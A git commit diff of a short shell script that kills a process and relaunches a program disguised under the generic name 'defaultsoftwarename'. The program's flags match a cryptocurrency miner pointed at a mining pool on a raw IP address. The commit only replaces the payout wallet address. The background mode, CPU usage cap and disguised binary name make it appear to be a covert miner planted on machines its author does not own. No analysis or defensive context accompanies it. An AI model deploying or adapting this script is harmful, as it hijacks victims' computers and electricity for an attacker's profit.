e5ed5a77b710db80820dc515556c366dd6fcb72d
snupsnep <69668425+snupsnep@users.noreply.github.com>
2020-08-16 17:23:01 +0300

    Update 6.sh

--- 6.sh
+++ 6.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 94.103.85.146:37612 -u 877XVG45BVjYqd5j8BpixVTKGDn881BiXhAc5b7CCHqc5xLJZ7ivrtgPoSGBhJGBbyWFUjbUKB6UUZ6EmLQnjykgQMAwXKi --pass=x:snupsnepp@yandex.ru --rig-id=06 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
+defaultsoftwarename -o 94.103.85.146:37612 -u 49qGfMHSdysD7gJCtJT6KAeQC2XFF9gYdSB1vLsDTLVWNHTRFCTqQ6vjAHt3NLLwZY2VM8Lybz4FhZH7xUhT5VCnBB1yiJn --pass=x:snupsnepp@yandex.ru --rig-id=06 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
